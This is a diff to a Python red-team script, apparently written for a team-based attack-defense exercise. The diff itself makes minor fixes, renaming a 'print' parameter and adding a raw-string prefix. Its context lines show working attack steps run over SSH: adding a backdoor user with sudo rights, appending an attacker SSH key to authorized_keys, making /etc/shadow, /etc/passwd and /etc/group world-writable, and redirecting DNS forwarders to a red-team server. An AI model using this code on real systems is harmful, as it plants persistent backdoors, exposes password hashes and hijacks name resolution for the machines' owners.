@@ -53,11 +53,11 @@ def main():
     
     e_process.join()
 
-def log_line(message, host, print=False):
+def log_line(message, host, print_flag=False):
     file_name = "team{0}-{1}.log".format(host.team, host.name)
     with open(file_name, "a") as log:
         log.write(message)
-    if print:
+    if print_flag:
         print(message)
 
 def get_ssh_pub():
@@ -91,7 +91,7 @@ def universal_linux_attack(host):
     user_add_cmd = "useradd -m -d /home/{0}/ -s /bin/bash {0}".format(username)
     
     
-    log_line("Adding user {0} with password \'{1}\' to {2}".format(username, password, host.ip), host, print=True)
+    log_line("Adding user {0} with password \'{1}\' to {2}".format(username, password, host.ip), host, print_flag=True)
     
     ssh.sendline(user_add_cmd)
     ssh.prompt()
@@ -107,7 +107,7 @@ def universal_linux_attack(host):
     log_line(ssh.before.decode('utf8'), host)
     
     # add user to sudoers
-    log_line("Adding user {0} to sudoers on {1}.".format(username, host.ip), host, print=True)
+    log_line("Adding user {0} to sudoers on {1}.".format(username, host.ip), host, print_flag=True)
     sudo_add_cmd = "usermod -a -G admin {0} || usermod -a -G wheel {0}".format(username)
     ssh.sendline(sudo_add_cmd)
     ssh.prompt()
@@ -132,7 +132,7 @@ def universal_linux_attack(host):
 
         ssh_add_cmd = "echo \"{0}\" >> {1}".format(ssh_pub_key, authorized_keys_file)
 
-        log_line("Adding SSH key to user {0} at {1} to sudoers on {2}.".format(user, authorized_keys_file, host.ip), host, print=True)
+        log_line("Adding SSH key to user {0} at {1} to sudoers on {2}.".format(user, authorized_keys_file, host.ip), host, print_flag=True)
         authorized_perms_cmd = "chmod 600 {1} && chown {0}:{2} {1}".format(user, authorized_keys_file, user_group[user])
         
         commands_to_run = [sshdir_make_cmd, sshdir_perms_cmd, ssh_add_cmd, authorized_perms_cmd]
@@ -146,7 +146,7 @@ def universal_linux_attack(host):
     # ez mode /etc/shadow
     shadow_perms_cmd = "chmod 777 /etc/shadow"
     ssh.prompt()
-    log_line("Setting permissions to 777 on /etc/shadow on {}".format(host.ip), host, print=True)
+    log_line("Setting permissions to 777 on /etc/shadow on {}".format(host.ip), host, print_flag=True)
     ssh.sendline(shadow_perms_cmd)
     ssh.prompt()
     log_line(ssh.before.decode('utf8'), host)
@@ -154,7 +154,7 @@ def universal_linux_attack(host):
     # ez mode /etc/passwd
     passwd_perms_cmd = "chmod 777 /etc/passwd"
     
-    log_line("Setting permissions to 777 on /etc/shadow on {}".format(host.ip), host, print=True)
+    log_line("Setting permissions to 777 on /etc/shadow on {}".format(host.ip), host, print_flag=True)
     ssh.sendline(passwd_perms_cmd)
     ssh.prompt()
     log_line(ssh.before.decode('utf8'), host)
@@ -162,7 +162,7 @@ def universal_linux_attack(host):
      # ez mode /etc/group
     group_perms_cmd = "chmod 777 /etc/group"
     
-    log_line("Setting permissions to 777 on /etc/group on {}".format(host.ip), host, print=True)
+    log_line("Setting permissions to 777 on /etc/group on {}".format(host.ip), host, print_flag=True)
     ssh.sendline(group_perms_cmd)
     ssh.prompt()
     log_line(ssh.before.decode('utf8'), host)
@@ -179,7 +179,7 @@ def ubuntu_attacks(host):
     ssh = pxssh.pxssh()
     ssh.login(host.ip, host.username, password=host.password)
     red_team_dns = "10.0.0.23"
-    change_forwarders_cmd = "sed -i s/131\.239\.30\.1/{}/g".format(red_team_dns)
+    change_forwarders_cmd = r"sed -i s/131\.239\.30\.1/{}/g".format(red_team_dns)
     reload_bind_cmd = '/etc/init.d/bind9 restart'
 
     ssh.prompt()
@@ -208,7 +208,7 @@ def ubuntu_attacks(host):
 
         ssh_add_cmd = "echo \"{0}\" >> {1}".format(ssh_pub_key, authorized_keys_file)
 
-        log_line("Adding SSH key to user {0} at {1} to sudoers on {2}.".format(user, authorized_keys_file, host.ip), host, print=True)
+        log_line("Adding SSH key to user {0} at {1} to sudoers on {2}.".format(user, authorized_keys_file, host.ip), host, print_flag=True)
         authorized_perms_cmd = "chmod 600 {1} && chown {0}:{2} {1}".format(user, authorized_keys_file, user_group[user])
         
         commands_to_run = [sshdir_make_cmd, sshdir_perms_cmd, ssh_add_cmd, authorized_perms_cmd]
